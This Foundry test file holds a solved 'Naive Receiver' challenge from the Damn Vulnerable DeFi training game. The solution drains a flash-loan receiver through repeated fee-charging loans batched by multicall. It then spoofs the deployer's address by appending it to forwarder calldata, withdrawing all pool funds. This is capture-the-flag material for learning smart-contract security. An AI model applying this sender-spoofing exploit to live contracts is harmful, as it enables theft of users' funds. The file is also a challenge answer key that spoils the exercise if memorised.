// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract NaiveReceiverChallenge is Test {
    using MessageHashUtils for bytes32;

    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        uint256 flashLoanFee = pool.flashFee(address(weth), WETH_IN_RECEIVER);
        uint256 iterations = WETH_IN_RECEIVER / flashLoanFee;
        bytes[] memory messages = new bytes[](iterations);
        uint256 poolStartingBalance = weth.balanceOf(address(pool));

        vm.startPrank(player);
        for (uint8 i = 0; i < iterations; i++) {
            messages[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                address(receiver),
                address(weth),
                WETH_IN_RECEIVER,
                hex""
            );
        }

        bytes[] memory results = pool.multicall(messages);


        assertEq(weth.balanceOf(address(receiver)), 0);
        assertEq(
            weth.balanceOf(address(pool)),
            poolStartingBalance + WETH_IN_RECEIVER
        );

        console.log("Deployer pool deposits: ", pool.deposits(deployer));
        vm.stopPrank();

        bytes memory deployerAddressInBytes = abi.encode(deployer);
        bytes memory forwarderRequestCalldata = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector,
            WETH_IN_RECEIVER + WETH_IN_POOL,
            recovery
        );

        bytes memory forwarderRequestData = bytes.concat(
            forwarderRequestCalldata,
            deployerAddressInBytes
        );
        bytes[] memory forwarderRequestMultiCallData = new bytes[](1);
        forwarderRequestMultiCallData[0] = forwarderRequestData;

        abi.encodeWithSelector(
            Multicall.multicall.selector,
            forwarderRequestMultiCallData
        );

        BasicForwarder.Request memory forwarderRequest = BasicForwarder
            .Request({
                from: player,
                target: address(pool),
                value: 0,
                gas: 500_000,
                nonce: 0,
                data: abi.encodeWithSelector(
                    Multicall.multicall.selector,
                    forwarderRequestMultiCallData
                ),
                deadline: block.timestamp + 1 days
            });

        bytes32 forwarderRequestDataHash = forwarder.getDataHash(
            forwarderRequest
        );
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 digestHash = domainSeparator.toTypedDataHash(
            forwarderRequestDataHash
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(deployer);
        // console.log("Deployer address: ", deployer);
        // console.log("Recovery address: ", recovery);
        // console.log("Player address: ", player);
        // console.log("Receiver address: ", address(receiver));

        bool result = forwarder.execute(forwarderRequest, signature);

        // console.log("Deployer pool deposits: ", pool.deposits(deployer));
        // console.log("Recovery WETH balance: ", weth.balanceOf(recovery));
        // console.log("Pool WETH balance: ", weth.balanceOf(address(pool)));
        // console.log(
        //     "Receiver WETH balance: ",
        //     weth.balanceOf(address(receiver))
        // );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
